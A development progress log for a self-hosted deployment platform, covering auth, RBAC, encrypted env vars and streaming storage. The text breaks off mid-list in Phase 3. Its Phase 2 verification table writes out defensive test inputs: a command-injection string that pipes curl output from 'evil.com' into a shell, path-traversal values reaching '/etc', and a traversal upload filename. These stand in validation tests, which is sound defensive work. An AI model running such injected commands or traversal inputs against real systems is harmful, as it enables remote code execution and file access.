# ForgeCloud — Progress

Running record of what is actually built and verified, phase by phase (see
[docs/ROADMAP.md](./docs/ROADMAP.md)). Every phase gets: what shipped, the decisions made
along the way, how it was verified, and what's deliberately left for later.

| Phase | Title | Status | Completed |
|---|---|---|---|
| 0 | Foundations | ✅ Done | 2026-09-06 |
| 1 | Auth, orgs & RBAC | ✅ Done | 2026-09-06 |
| 2 | Projects & env vars | ✅ Done | 2026-09-06 |
| 3 | Storage & streams | ✅ Done | 2026-09-06 |
| 4 | Queue & worker skeleton | ✅ Done | 2026-09-06 |
| 5 | Realtime (WebSockets + Pub/Sub) | ✅ Done | 2026-09-07 |
| 6 | Real builds via `child_process` | ⬜ Not started | — |
| 7 | Docker deployment via `dockerode` | ⬜ Not started | — |
| 8 | Retries, rollback, idempotency, DLQ | ⬜ Not started | — |
| 9 | Observability | ⬜ Not started | — |
| 10 | Local scaling | ⬜ Not started | — |
| 11 | Hardening & failure demos | ⬜ Not started | — |
| 12 | Polish for presentation | ⬜ Not started | — |

---

## Phase 0 — Foundations ✅

**Goal:** the monorepo boots, connects to Postgres + Redis, and returns a health check.
**Completed:** 2026-09-06.

### What shipped

**Workspace / tooling**
- `pnpm-workspace.yaml` (`apps/*`, `packages/*`), root `package.json` with the scripts from
  CLAUDE.md §5 plus `infra:up`/`infra:down`/`infra:logs`.
- `tsconfig.base.json` — strict, `noUncheckedIndexedAccess`, ESM (`NodeNext`),
  `verbatimModuleSyntax`, `composite` so packages can be project-referenced.
- Flat ESLint config (`eslint.config.js`) + Prettier + `.gitignore` + `.env.example` (every var
  documented) + `.env` created from it.
- Docs moved into `docs/` so the paths in CLAUDE.md and README resolve.

**`packages/shared`** (leaf — depends on nothing internal)
- `AppError` + typed constructors (`notFound`, `forbidden`, `conflict`, …) and `isAppError`.
- Enums mirroring the Postgres enums: `ORG_ROLES` (+ `ORG_ROLE_RANK` for RBAC comparisons),
  `DEPLOYMENT_STATUSES` (+ `isTerminalStatus`), `WORKER_STATUSES`, `FILE_KINDS`, `LOG_STREAMS`.
- Zod schemas + inferred types for the health/error API responses.
- `REDIS_KEYS`, `REDIS_CHANNELS`, `QUEUE_NAMES` — every key/channel built in one place.

**`packages/config`**
- Zod-parsed env (`env`) with defaults and coercion; invalid config prints the offending fields
  and exits 1 (nothing can run without it, and the logger itself depends on it).
- `.env` is found by walking up from the app's cwd, so `apps/api` and `apps/worker` share the
  repo-root file.
- `createLogger()` — pino, ISO timestamps, `pino-pretty` in dev, and a redaction list
  (`password`, `token`, `secret`, `authorization`, `cookie`, `value_enc`, …) so CLAUDE.md §8
  "secrets are never logged" is enforced by the logger, not by discipline.

**`infra/docker-compose.yml`**
- Postgres 16 + Redis 7, both with healthchecks and named volumes. Redis runs with
  `--appendonly yes` so queue state survives a compose restart.

**`packages/db`**
- Kysely client over a `pg` Pool: singleton per process, 5s connect timeout (fail fast when
  Postgres is down), pool `error` handler so an idle-client drop can't crash the process,
  `int8` parsed as a JS number for the append-only event ids.
- `pingDb()` and `closeDb()` for `/health` and graceful shutdown.
- Hand-written Kysely `Database` types + `Selectable`/`Insertable`/`Updateable` aliases.
- `scripts/migrate.ts` — wrapper around `node-pg-migrate` that injects the validated
  `DATABASE_URL`, resolves the migrations dir from the package (not the caller's cwd), and runs
  the ESM bin with `--tsx`. `spawn` with an argv array, `shell:false` (CLAUDE.md §8).
- First migration `1757000000000_init-identity.ts`: `pgcrypto` + `citext` extensions,
  `set_updated_at()` trigger function, `org_role` enum, and `users` / `organizations` /
  `org_members` with FKs, indexes and `updated_at` triggers. Reversible `down`.

**`apps/api`** (Fastify 5)
- `buildApp()` assembles the instance: pino logger, Zod type provider
  (`fastify-type-provider-zod`), CORS restricted to `CORS_ORIGIN`, 1 MiB body limit.
- Request id: honours an inbound `x-request-id`, else mints a UUID; echoed on every response
  and attached to every log line and error body.
- `plugins/error-handler.ts` — the single error→response mapping: Zod validation errors → 400
  with field details, response-serialization failures → 500, `AppError` → its own status/code,
  everything else → `INTERNAL_ERROR` 500. Stacks and `cause` are logged, never returned. Custom
  404 handler in the same shape.
- `routes/health.ts` + `services/health-service.ts` — `/health` and `/health/ready` probe
  Postgres and Redis **in parallel with a 3s per-check timeout** and return per-dependency
  `{ ok, latencyMs, error }`; 200 when both answer, 503 otherwise (body is identical, so the
  dashboard can render *why*). `/health/live` is a pure liveness probe that touches nothing.
- `lib/redis.ts` — ioredis command connection, connected explicitly at boot, capped retry
  strategy, `maxRetriesPerRequest: 2` so a dead Redis fails a request in seconds instead of
  hanging it.
- `server.ts` — graceful shutdown on `SIGTERM`/`SIGINT`: stop accepting connections, drain
  in-flight requests via `app.close()`, then close the DB pool and Redis, with a
  `SHUTDOWN_TIMEOUT_MS` hard timer that forces exit. `unhandledRejection` / `uncaughtException`
  are logged fatally and routed through the same path.

**`apps/dashboard`** (Next.js 15, App Router)
- Tailwind v4 + TanStack Query provider (client created lazily, one per session).
- `HealthPanel` polls `/health` every 5s and renders overall state, per-dependency latency or
  error, API version/uptime and last-checked time; shows an explicit "cannot reach the API"
  state instead of an empty page.
- Landing page shows the roadmap phase list with Phase 0 marked done.

### Decisions & assumptions

- **Host ports 5433 (Postgres) / 6380 (Redis).** This machine already has Postgres on 5432 and
  Redis on 6379; shifting the container ports avoids a collision. `.env.example` reflects it.
- **`packages/shared` was built in Phase 0**, ahead of the roadmap, because `db`, `config` and
  `api` all needed `AppError` and the shared enums immediately. It's still the dependency leaf.
- **API on port 4000, dashboard on 3000.** README previously implied the dashboard at 3000; the
  API needed its own port.
- **Kysely types are hand-written** (`packages/db/src/types.ts`) rather than codegen'd, so they
  can be updated in the same commit as the migration without needing a live DB. They must be
  edited alongside every future migration.
- **`updated_at` is maintained by a Postgres trigger**, not by each repository — multiple
  processes write these rows and a trigger can't be forgotten.
- **Redis lives in `apps/api/src/lib/redis.ts` for now.** Per `docs/ARCHITECTURE.md` §2.4 the
  shared connection factory belongs in `@forge/queue`; that package doesn't exist until Phase 4,
  and this moves there then.
- **`/health` returns 503 when a dependency is down** (with the full body) rather than 200 with a
  flag — makes it usable as a real readiness probe and drives the failure demo in Phase 11.
- **Fastify's instance decorator is `apiVersion`**, not `version` (Fastify owns `version`).

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm install` | ✅ 277 packages; `esbuild` build script approved via `pnpm.onlyBuiltDependencies` |
| `docker compose -f infra/docker-compose.yml up -d` | ✅ `forge-postgres` + `forge-redis` both report `healthy` |
| `pnpm --filter @forge/db migrate up` | ✅ migration applied; `\dt` shows `users`, `organizations`, `org_members`, `pgmigrations`; `org_role` type exists |
| `pnpm typecheck` | ✅ clean across all 5 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ packages + api (tsc) + dashboard (`next build`, 4 static routes) |
| `GET /health` (all up) | ✅ `200 {"ok":true,…,"postgres":{"ok":true,"latencyMs":16},"redis":{"ok":true,"latencyMs":3}}` |
| `GET /health/live` | ✅ `200 {"ok":true,"pid":…}` |
| Unknown route | ✅ `404 {"error":{"code":"ROUTE_NOT_FOUND",…},"requestId":"…"}` |
| Redis stopped | ✅ `503`, `redis.error: "connect ECONNREFUSED 127.0.0.1:6380"`, API stays up; recovers to `200` when restarted |
| Postgres stopped | ✅ `503`, `postgres.error: "connect ECONNREFUSED 127.0.0.1:5433"`, API stays up; recovers to `200` |
| `SIGTERM` to the API | ✅ logs `shutting down (SIGTERM)` → `shutdown complete`, exits, port released |
| CORS from `http://localhost:3000` | ✅ preflight `204`, `access-control-allow-origin` + `x-request-id` exposed |
| `pnpm dev` | ✅ package watchers + API (`:4000`) + dashboard (`:3000`) all up, both return `200` |

### Not done / deferred on purpose

- No tests yet (Vitest lands with the first real business logic in Phase 1).
- No `apps/worker`, `packages/queue`, `packages/storage` — Phases 3–4.
- No auth: every route is currently public. Phase 1.
- `git init` was run so `.gitignore` applies; nothing has been committed yet.

### Next up — Phase 1 (Auth, orgs & RBAC)

Register/login with argon2, opaque sessions in Redis, `auth` plugin attaching `user`/`org`/`role`,
`requireRole()`, org + member CRUD, API keys, Redis rate limiting, and the dashboard auth screens.

---

## Phase 1 — Auth, orgs & RBAC ✅

**Goal:** a user can register, log in, create an org, and permissions are enforced.
**Completed:** 2026-09-06.

### What shipped

**`packages/shared`** (`src/auth.ts`, `src/constants.ts`)
- Zod schemas + inferred types for the whole auth surface: `registerSchema`, `loginSchema`,
  `publicUserSchema`, `publicOrgSchema`, `orgMembershipSchema`, `orgMemberSchema`,
  `addMemberSchema`, `updateMemberSchema`, `createApiKeySchema`, `apiKeySchema`,
  `createdApiKeySchema`, `sessionResponseSchema`, `authResponseSchema`.
- `passwordSchema` is length-only (10–200 chars) — length is what resists guessing; argon2
  handles the rest. `emailSchema` trims + lowercases. `slugSchema` + `slugify()` shared by orgs
  and projects.
- `REDIS_KEYS.session(tokenHash)` and `REDIS_KEYS.userSessions(userId)` added;
  `RATE_LIMIT_NAMESPACE` + `rateLimitIdentity()` so the rate limiter's own per-route buckets
  also land under `rl:`.
- `API_KEY_PREFIX` (`fc_live_`) and `API_KEY_LOOKUP_LENGTH` so the API key format is defined once.

**`packages/config`**
- New env vars: `SESSION_TTL_SECONDS` (7d), `SESSION_COOKIE_NAME`, `SESSION_COOKIE_SECURE`,
  `ENCRYPTION_KEY`, `STORAGE_ROOT`, `MAX_UPLOAD_BYTES`. All documented in `.env.example`.
- `ENCRYPTION_KEY` is validated as **exactly 32 base64 bytes at boot** — a typo'd key fails
  startup rather than the first secret write.
- `STORAGE_ROOT` is resolved against the **repo root** (the dir holding `.env`), not the
  process cwd, so the API and the future worker agree on one object store.

**`packages/db`**
- Migration `1757100000000_auth-api-keys.ts` → `api_keys` (org-scoped, `prefix` UNIQUE +
  indexed, `key_hash`, `role`, `scopes`, `last_used_at`, `revoked_at`). Reversible.
- `ApiKeysTable` + `ApiKeyRow`/`NewApiKey`/`ApiKeyUpdate` added to the hand-written Kysely types.

**`apps/api`**
- `lib/crypto.ts` — argon2id (OWASP baseline: 19 MiB, t=2, p=1) for passwords; sha256 for
  session tokens and API keys; `generateToken()` (32 random bytes, base64url); `safeEqual()`
  (constant-time); `fakeVerifyPassword()` to equalise login timing for unknown emails.
- `lib/session-cookie.ts` — the one place that knows the cookie shape (`httpOnly`,
  `sameSite: lax`, `secure` in prod).
- `repositories/` — `user-repository`, `org-repository`, `api-key-repository`. `insertOrgWithOwner`
  creates the org + its first `owner` membership **in one transaction** (an ownerless org would be
  unreachable). `countOwners()` backs the last-owner guard.
- `services/session-service.ts` — opaque sessions in Redis, keyed by `sha256(token)` so a Redis
  keyspace dump can't be replayed. Per-user session index set enables `destroyAllSessions()`.
  **Sliding expiry** refreshes the TTL only past the half-life, so an active browser doesn't
  write to Redis on every request.
- `services/auth-service.ts` — register (auto-creates an owned org so the dashboard is never
  empty), login, `changePassword` (which revokes **every** session for that user).
  Postgres unique-violation `23505` is mapped to a clean 409 for the concurrent-register race.
- `services/org-service.ts` — org CRUD, members add/re-role/remove, with the guards:
  `assertCanGrant` (nobody grants above their own rank), owners only managed by owners, and
  `LAST_OWNER` protection.
- `services/api-key-service.ts` — create (returns plaintext **once**), list, revoke (tombstone,
  not delete), and `authenticateApiKey()` (prefix lookup → constant-time hash compare →
  revocation check).
- `plugins/auth.ts` — an `onRequest` hook that resolves either credential kind into one `Actor`
  shape, and never rejects (public routes stay public). Decorators: `requireAuth`, `requireOrg`,
  `requireRole(role)`, `getActor`, `getOrg`. `:orgId` accepts a **uuid or a slug**.
- `plugins/rate-limit.ts` — `@fastify/rate-limit` with the **Redis store** (counters shared
  across replicas, not per-process). Keyed by api-key → user → IP. `skipOnError: true` so a dead
  Redis degrades open rather than locking everyone out; the 429 is thrown as an `AppError` so it
  gets the same body shape as every other error.
- `routes/auth.ts` — `POST /auth/register|login|logout|change-password`, `GET /auth/me`.
- `routes/orgs.ts` — `GET/POST /orgs`, `GET/PATCH /orgs/:orgId`, members CRUD.
- `routes/api-keys.ts` — list/create/revoke under `/orgs/:orgId/api-keys`.

**`apps/dashboard`**
- `lib/api.ts` — `ApiError` carrying the server's own `code`/`message` (so RBAC denials render as
  real sentences), `credentials: 'include'` on every call, plus `hasRole()`/`ROLE_RANK` mirroring
  the server check so the UI hides what the API would refuse.
- `components/session-provider.tsx` — `/auth/me` once, shared; a 401 resolves to `null` rather
  than throwing. `useOrgRole(slug)`.
- `components/ui/primitives.tsx` — `Panel`/`Button`/`Field`/`Input`/`Select`/`ErrorNote`/
  `RoleBadge`/`Empty`.
- `components/auth-form.tsx` + `/login`, `/register`.
- `components/app-shell.tsx` — top bar with **org switcher** (incl. inline create), section nav,
  role badge, sign out. `components/require-session.tsx` gates org routes.
- `/orgs/[orgSlug]/members` — add by email, inline role dropdown, remove; owners shown as a
  badge (not editable), and a viewer sees an explanation instead of the controls.
- `/orgs/[orgSlug]/api-keys` — create, one-time plaintext reveal panel, revoke; the whole page
  is admin-gated with a stated reason.

### Decisions & assumptions

- **`api_keys` has a `role` column** (not in `docs/DATA_MODEL.md`). The data model only had
  `scopes`. A role makes RBAC a single comparison regardless of whether the caller is a human or
  a key. `scopes` is kept as specified but is **unused** in Phase 1. The table was created fresh,
  so this needed no data migration.
- **API keys are sha256, not argon2.** They're 256 bits of CSPRNG — nothing to guess — and auth
  runs on every request, so argon2 per request would be self-inflicted DoS. Passwords stay argon2id.
- **Redis session keys are `session:sha256(token)`.** The raw token exists only in the client
  cookie.
- **A non-member gets 404, not 403**, on `/orgs/:orgId/*` — 403 would confirm the org exists.
- **"Invite" means "add an existing user by email."** There's no mail delivery in this project;
  adding an unregistered email returns `USER_NOT_FOUND`.
- **`owner` is not grantable through the members API** (`addMemberSchema`/`updateMemberSchema`
  exclude it). Ownership transfer is deliberately a separate operation that doesn't exist yet.
- **API keys cannot create orgs or other API keys** — either would let a leaked key widen its own
  blast radius.
- **Registering creates an org** (`"<name>'s org"` unless `orgName` is given) so there is always
  an RBAC scope for projects to hang off.
- **`changePassword` revokes all sessions.** A password change that leaves a stolen cookie valid
  isn't a password change.
- **Rate limits:** global 300/min; `/auth/*` credential routes 10/min; API-key creation 20/min;
  source upload 30/min.
- **`@fastify/rate-limit` and `@fastify/cookie` are used rather than hand-rolled** — neither is a
  §4 learning goal, and both are first-party Fastify.
- **Session-service `destroyAllSessions` prunes the index set**, so a stale member is harmless.

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm typecheck` | ✅ clean across all 5 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ packages + api (tsc) + dashboard (`next build`, 8 routes) |
| `migrate up` | ✅ `api_keys` created with the prefix unique constraint + org index |
| `migrate down` ×2 then `up` | ✅ both new migrations roll back and re-apply cleanly |
| Register | ✅ `201`, `Set-Cookie: forge_session=…; HttpOnly; SameSite=Lax; Max-Age=604800`, org auto-created with role `owner` |
| Duplicate register | ✅ `409 EMAIL_TAKEN` |
| Password < 10 chars | ✅ `400 VALIDATION_ERROR` with the field path |
| Wrong password / unknown email | ✅ both `401` with the **identical** message `Invalid email or password` |
| `GET /auth/me` with cookie | ✅ `200` user + orgs + `via: "session"` |
| `GET /auth/me` with no credential | ✅ `401 UNAUTHORIZED` |
| Outsider reads someone else's org | ✅ `404 ORG_NOT_FOUND` (not 403) — same for its members list |
| Viewer creates a project | ✅ `403 FORBIDDEN` "requires the \"member\" role; you are a \"viewer\"" |
| Viewer renames org / adds member | ✅ `403` both |
| Viewer writes/deletes env var, deletes project | ✅ `403` all three |
| Viewer **reads** org + env list | ✅ `200`, secrets still masked |
| Grant `owner` via members API | ✅ `400 VALIDATION_ERROR` (excluded at the schema) |
| Sole owner demotes self | ✅ `409 LAST_OWNER` |
| Admin removes an owner | ✅ `403` "Only an owner can remove another owner" |
| API key create | ✅ `201`, plaintext `fc_live_…` returned once |
| API key list | ✅ prefix + metadata only; **no `key` field** in the response |
| Auth via `Authorization: Bearer fc_live_…` | ✅ `200`, `via: "api_key"`, scoped to its one org |
| Key creates an org | ✅ `403` |
| Key mints another key | ✅ `403` |
| `member`-role key creates a project | ✅ `201` |
| Tampered key (last char changed) | ✅ `401` |
| Revoked key reused | ✅ `401` |
| Login rate limit | ✅ attempts 1–10 → `401`, 11–13 → `429 RATE_LIMITED`; counters visible as `rl:POST/auth/login-ip:127.0.0.1` in Redis |
| Session keys in Redis | ✅ `session:<64-hex>` with TTL ≈604800; `user:<id>:sessions` index present |
| 3 sessions → change password | ✅ `204`, index count 5→0, all three cookies then `401`, old password `401`, new password `200` |
| Single logout | ✅ `204`, that cookie `401`, others unaffected |
| **Browser (headless Chrome)** register → org → project → env → members → API key → revoke → sign out | ✅ 15/15 checks (see Phase 2 table for the shared run) |

### Not done / deferred on purpose

- **No tests committed.** Verification was done with curl + a headless-Chrome script in the
  scratchpad, not with Vitest. Committing real Vitest suites is still outstanding and is the
  biggest gap in these two phases.
- No email delivery, so **no email verification and no password reset** (`users.email_verified_at`
  exists but is never set) and no pending-invite flow.
- **`api_keys.scopes` is stored but never enforced.**
- **No `audit_logs` table or writes** — it's in `DATA_MODEL.md` but not in the Phase 1 checklist;
  mutations currently log via `pino` only.
- **No ownership transfer** endpoint.
- `assertCanGrant` is defence-in-depth only: with `owner` excluded at the schema, `admin` is the
  highest grantable role, so the check can't currently fire through a route.
- No CSRF token. Not needed yet: the session cookie is `SameSite=Lax` and every mutation is a
  non-simple cross-origin request gated by CORS.

### Next up — Phase 2

Projects and env vars on top of this RBAC (shipped in the same session — see below).

---

## Phase 2 — Projects & env vars ✅

**Goal:** manage the thing we'll deploy.
**Completed:** 2026-09-06.

### What shipped

**`packages/shared`** (`src/projects.ts`)
- `projectSchema`, `createProjectSchema`, `updateProjectSchema`, `envVarSchema`,
  `upsertEnvVarSchema`, `bulkEnvVarsSchema`, `storedFileSchema`, `sourceTypeSchema`.
- **`commandSchema` rejects shell metacharacters** (`; & | ` $ > < \` and newlines). Commands run
  through `spawn(..., {shell:false})` so they could never reach a shell anyway — but failing at
  write time is far clearer than failing mid-build, and it's the §8 rule made visible.
- **`relativeDirSchema`** rejects absolute paths and any `..` segment.
- `envVarKeySchema` enforces POSIX-ish names; `healthPathSchema` requires a leading `/`.
- `envVarSchema.value` is **nullable** and `valueLength` is always present — that's the contract
  that lets the UI render `•••• (22)` without ever seeing a secret.

**`packages/db`**
- Migration `1757200000000_projects-env-files.ts` → `file_kind` enum + `projects`,
  `project_env_vars`, `files`; unique `(org_id, slug)` and `(project_id, key)`; check constraints
  on `source_type` and `app_port`; `updated_at` triggers. Reversible.
- Kysely types for all three tables. `project_env_vars.value_enc` is typed `Buffer`.

**`apps/api`**
- `lib/secret-box.ts` — AES-256-GCM with a versioned wire format
  (`version || 12-byte iv || 16-byte tag || ciphertext`) in one `bytea`. Fresh random iv per
  write; the version byte exists so a future key rotation can still read old rows.
- `lib/storage-path.ts` — the **only** place the API joins filesystem paths. Per-segment
  rejection of `..`/separators/NUL, lexical containment check against `STORAGE_ROOT`, plus
  `assertInsideStorageRoot()` which resolves symlinks for read paths.
- `services/project-service.ts` — CRUD with per-org slug uniqueness (auto `-2`, `-3` suffixes),
  `requireProject(orgId, projectId)` as the single lookup so the org filter can't be forgotten,
  and an **explicit camelCase → snake_case patch map** so an unexpected body key can't reach the
  `UPDATE`.
- `services/env-var-service.ts` — everything encrypted at rest regardless of `is_secret`;
  `is_secret` governs **disclosure** only. `resolveEnvForBuild()` and `revealEnvVar()` return
  plaintext and are deliberately **not wired to any HTTP route** — they're for the Phase 6 worker.
- `services/upload-service.ts` — streamed intake via `stream/promises.pipeline` (real
  backpressure, teardown on failure). A `HashingCounter` `Transform` computes sha256 **and**
  enforces `MAX_UPLOAD_BYTES` in the same single pass, aborting mid-stream rather than writing
  the rest. Partial files are unlinked in the failure path; the truncation check runs **before**
  the `files` row is inserted.
- `repositories/project-repository.ts`, `repositories/env-var-repository.ts` — every read filters
  by `org_id`/`project_id`; bulk env upsert runs in one transaction.
- `services/serializers.ts` — central row → response mapping. `password_hash`, `key_hash` and
  `value_enc` have **no mapping at all**, so a new column can't leak by accident.
- `routes/projects.ts` — projects CRUD, env var set/bulk-set/delete/list, and
  `POST|GET /orgs/:orgId/projects/:projectId/source`.
- `app.ts` — registers `@fastify/cookie` (before auth, which reads `request.cookies`),
  `@fastify/multipart` (`fileSize: MAX_UPLOAD_BYTES + 64 KiB`, `files: 1`), rate limit, auth,
  and all routes. API version bumped to `0.2.0`.

**`apps/dashboard`**
- `/orgs/[orgSlug]` — project list + inline create; a viewer sees "Requires the 'member' role".
- `/orgs/[orgSlug]/projects/[projectId]` — settings form (name, root dir, three commands, port,
  health path/timeout), all inputs disabled for a viewer.
- `components/env-vars-panel.tsx` — set one var with a secret toggle, **paste a `.env` block**
  (parsed client-side, comments/quotes handled, everything imported as secret), delete. Secrets
  render as bullets + a character count.
- `components/source-upload-panel.tsx` — file picker with a **real upload progress bar** (XHR,
  because `fetch` still can't report upload progress), then a list of stored archives with size,
  sha256 prefix and timestamp.

### Decisions & assumptions

- **`projects.slug` and `source_type` are create-only** (omitted from `updateProjectSchema`).
  Changing a slug after source is stored under `<org>/<project>/…` would orphan it.
- **Two forward references left unconstrained** until `deployments` exists (Phase 4):
  `projects.active_deployment_id` and `files.deployment_id` are plain `uuid` columns; their FKs
  are added in the deployments migration. `files.deployment_id` is indexed already.
- **`files.original_name` added** (not in `DATA_MODEL.md`) to display the uploaded filename.
  It is **never** used to build a path — the stored object is always `<uuid><ext>`.
- **`project_env_vars.value_length` added** so the UI can show a masked length without
  decrypting. It's plaintext length, which is not sensitive.
- **Non-secret env values are still encrypted** at rest — one code path, no branch to forget.
- **Allowed upload extensions:** `.zip`, `.tar`, `.gz`, `.tgz`; a missing extension is treated as
  `.zip`. Archives are **not** unpacked yet — extraction lands with the Phase 6 `cloning` stage
  (and zip-slip defence belongs there).
- **Storage layout:** `<STORAGE_ROOT>/<orgId>/<projectId>/sources/<uuid><ext>` — every segment is
  a uuid or a fixed literal, so no user input reaches a path. Multiple uploads accumulate;
  the newest source row is what a deployment will use.
- **Upload uses `@fastify/multipart`'s streaming `request.file()`**, not its buffering mode.
- **RBAC on projects:** read = any member, write (project + env vars + upload) = `member`,
  delete project = `admin`. Setting config is normal work; a viewer must not change what runs.
- **Deleting a project leaves its bytes on disk.** The DB rows cascade, but a storage sweep
  belongs with the rest of the storage lifecycle in Phase 3, and orphaned bytes are safer than a
  delete racing a running build.
- **`packages/storage` was not created.** Phase 3 owns it; the API is the only writer for now and
  `lib/storage-path.ts` + `upload-service.ts` are written to be lifted into it.

### Verification (all run on 2026-09-06)

| Check | Result |
|---|---|
| `pnpm typecheck` / `pnpm lint` / `pnpm build` | ✅ all clean |
| `migrate up` | ✅ `projects`, `project_env_vars`, `files` + `file_kind` created; `migrate down` ×2 → `up` round-trips |
| Create project with commands/port/health | ✅ `201`, all fields persisted as sent |
| Duplicate name | ✅ slug auto-suffixed to `sample-app-2` |
| Explicit duplicate slug | ✅ `409 PROJECT_SLUG_TAKEN` |
| **Command injection** `"npm run build; curl evil.com \| sh"` | ✅ `400 VALIDATION_ERROR` — "Commands run without a shell; …" |
| **Path traversal** `rootDir: "../../etc"` | ✅ `400` "Path traversal is not allowed" |
| **Absolute** `rootDir: "/etc/passwd"` | ✅ `400` "Must be a relative path inside the project" |
| PATCH project | ✅ `200`, only the sent fields changed |
| Cross-tenant probe of another org's project uuid | ✅ `404 PROJECT_NOT_FOUND` |
| Set secret env var | ✅ `201`-equivalent `200`, response has `value: null`, `valueLength: 22` |
| Set non-secret env var | ✅ `value: "production"` returned |
| Bulk set | ✅ both stored; secrets masked, non-secrets in clear |
| **Secret plaintext in any API response** | ✅ `grep` over the full env list → **0 occurrences** |
| **Ciphertext in Postgres** | ✅ `value_enc` is opaque hex; `select count(*) … position('super-secret' in encode(value_enc,'escape'))>0` → **0 rows** |
| Invalid env key `9BAD-KEY` | ✅ `400 VALIDATION_ERROR` |
| Duplicate key inside one bulk request | ✅ `400 DUPLICATE_ENV_KEY` |
| Delete env var | ✅ `204`, gone from the list |
| Upload a real 553-byte zip | ✅ `201`; `storagePath` = `<orgId>/<projectId>/sources/<uuid>.zip` |
| **Checksum** vs `sha256sum` on the source file | ✅ byte-identical: `3f762ea8504320246f75996a2f00430148e4b26d93f4be629dbd404cd07b121a` |
| Bytes on disk | ✅ 553 B present under `STORAGE_ROOT`, nowhere else |
| **Traversal filename via curl** `filename=../../../../tmp/pwned.zip` | ✅ `201` with a uuid path; `/tmp/pwned.zip` does not exist |
| **Traversal filename via hand-built raw multipart** `../../../../../../tmp/pwned-raw.zip` | ✅ `201` with a uuid path; nothing written outside the root (verified with `find /tmp -name "pwned*"` → empty) |
| Disallowed extension `.exe` | ✅ `400 UNSUPPORTED_FILE_TYPE` |
| Empty file | ✅ `400 EMPTY_UPLOAD` |
| **51 MiB upload vs the 50 MiB cap** | ✅ `400 UPLOAD_TOO_LARGE`, **no partial file left on disk**, **no `files` row** with `size_bytes > 52428800` |
| Viewer uploads source | ✅ `403` |
| **Browser E2E (headless Chrome)** register → create project → PATCH settings → set secret → paste `.env` → upload archive | ✅ secret never in the DOM, non-secret shown in clear, bulk import stored as secrets, checksum + filename displayed |
| **Browser RBAC** viewer on projects/members/api-keys | ✅ no create button, restriction explained on all three pages |
| Final run on a freshly migrated schema | ✅ register → project → secret env → upload all `200`/`201`; secret leak count `0` |

### Bug found and fixed during verification

- **`@fastify/cors` v11 defaults to `methods: 'GET,HEAD,POST'`.** Every `PATCH`/`PUT`/`DELETE`
  from the dashboard was failing its CORS preflight in a real browser (project settings save, env
  var set/delete, member re-role/remove, API key revoke, project delete) — invisible to curl,
  which doesn't preflight. `app.ts` now sets `methods` and `allowedHeaders` explicitly. Confirmed
  by re-running the preflight for all four verbs and then the browser E2E.
- **Tailwind width conflict** on the members role dropdown: the `Select` base class carries
  `w-full`, so a `w-32` prop is the same specificity and lost, making the row wrap. Width now
  lives on a wrapper `div`.

### Not done / deferred on purpose

- **No Vitest suites** (see Phase 1). All verification was manual/scripted.
- **Archives are never unpacked or validated as archives** — only the extension is checked. Zip
  bombs and zip-slip are Phase 6 concerns, at extraction time.
- **No download/read endpoint** for stored files; `assertInsideStorageRoot()` exists for it but
  is currently unused. Phase 3.
- **Git source intake** (`source_type: 'git'`, `repo_url`) is accepted and stored but nothing
  clones it. Explicitly a later phase.
- **No storage garbage collection**, no per-org quota, no `usage` metering.
- **No `domains` table** — Phase 12 stretch.
- Superseded source uploads are never pruned.
- `ENCRYPTION_KEY` rotation is designed for (version byte) but there's no re-encrypt command.

### Next up — Phase 3 (Storage & streams)

Extract `packages/storage` from `apps/api/src/lib/storage-path.ts` +
`services/upload-service.ts` behind a streamed `put/get/list/delete` interface, add gzip artifact
compression via `node:zlib` in a **worker thread** plus sha256 checksums, and add the streaming
download endpoint (which is where `assertInsideStorageRoot()` finally gets used). The `files`
table, the storage layout and the path-sandbox helper are already in place; Phase 3 is mostly
moving them behind an interface and adding the read path. Worth doing first: the Vitest suites
both phases deferred, since services are already pure enough to unit-test with fake repositories.

---

## Phase 3 — Storage & streams ✅

**Goal:** real streaming IO for uploads/downloads/artifacts.
**Completed:** 2026-09-06.

### What shipped

**`packages/storage`** (new package, `@forge/storage` — depends on `@forge/shared` only)
- `src/keys.ts` — object keys are S3-shaped opaque strings (`<orgId>/<projectId>/sources/<uuid>.zip`).
  One validator (`assertValidKey`) rejects empty/oversized keys, leading/trailing `/`, backslashes,
  NUL, untrimmed segments and **any dot-prefixed segment** (which covers `.`/`..`). Layout builders
  (`sourceKey`, `artifactKey`, `logKey`, `projectPrefix`, `orgPrefix`) live here, so the API and the
  worker can't disagree about where a project's objects are.
- `src/local-object-store.ts` — `LocalObjectStore` implementing `put/get/head/list/delete/deletePrefix`.
  Every operation is a `pipeline()` chain (no buffering, real backpressure). Writes are staged in a
  dot-prefixed temp file next to the target and `rename()`d in only after the whole stream is
  accepted, so a rejected, oversized or interrupted write leaves **no object**. Reads go through
  `resolveExistingKey()`, which `realpath()`s the target and re-checks containment — the only way to
  catch a symlink planted inside the root. `list()` walks recursively and reports regular files only,
  skipping symlinks and staged temps.
- `src/hashing.ts` — `HashingCounter`, a `Transform` that computes sha256 **and** enforces a byte cap
  in the same pass over data we were already streaming (lifted out of the Phase 2 upload service).
- `src/compress-worker.ts` — the `worker_threads` body: `read → sha256 → gzip → sha256 → write`,
  streamed inside the thread, so memory stays flat and both checksums come free. Also `gunzip` and a
  standalone `checksum` op. Handles no keys and no DB — just absolute paths handed to it.
- `src/compress-pool.ts` — a fixed-size pool (default `min(2, cpus-1)`), **lazily spawned** (a process
  that never compresses never pays for a thread), FIFO queue, per-task ids, worker death fails only
  that task and drops the slot, and `closeCompressionPool()` waits for in-flight work before
  terminating. `compressionPoolStats()` exposes threads/busy/queued.
- `src/compress.ts` — `gzipObject` / `gunzipObject` / `checksumObject`: the main thread does key
  validation, symlink-resolved read paths and the staged write + commit; the thread does the CPU.
- `src/compress-protocol.ts` — the message contract, shared by both sides, with `ResultFor<T>` so
  callers need no casts.

**`packages/db`**
- Migration `1757300000000_file-compression.ts` — four nullable columns on `files`:
  `parent_file_id` (→ `files(id) ON DELETE SET NULL`), `compression`, `uncompressed_bytes`,
  `uncompressed_checksum`; a check constraint limiting `compression` to `'gzip'`, a second one
  keeping the metadata coherent (compressed ⇒ both sides described), and an index on
  `parent_file_id`. Reversible; no data migration needed.
- Kysely types updated; `docs/DATA_MODEL.md`'s `files` table updated to match.

**`packages/shared`**
- `FILE_COMPRESSIONS` / `fileCompressionSchema`.
- `storedFileSchema` extended with `parentFileId`, `compression`, `uncompressedBytes`,
